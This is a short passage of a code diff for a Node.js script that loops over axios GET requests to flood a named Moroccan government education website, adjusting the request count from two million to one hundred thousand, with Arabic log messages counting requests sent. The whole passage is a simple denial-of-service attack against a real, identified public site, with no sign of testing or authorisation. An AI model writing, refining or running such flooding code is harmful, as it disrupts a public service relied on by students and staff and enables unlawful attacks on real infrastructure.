@@ -1,10 +1,12 @@
 const axios = require('axios');
 
-function sendRequests() {
-  const url = 'https://massar.men.gov.ma';
-  const concurrency = 2000000;
+async function sendRequests() {
+  const url = 'https://massar.men.gov.ma'; // تم تغيير الرابط هنا
+  const requestsCount = 100000;
 
-  for (let i = 0; i < concurrency; i++) {
+  console.log('بدء إرسال الطلبات...');
+
+  for (let i = 0; i < requestsCount; i++) {
     axios.get(url)
       .then(() => {
         console.log(`تم إرسال الطلب رقم ${i + 1}`);
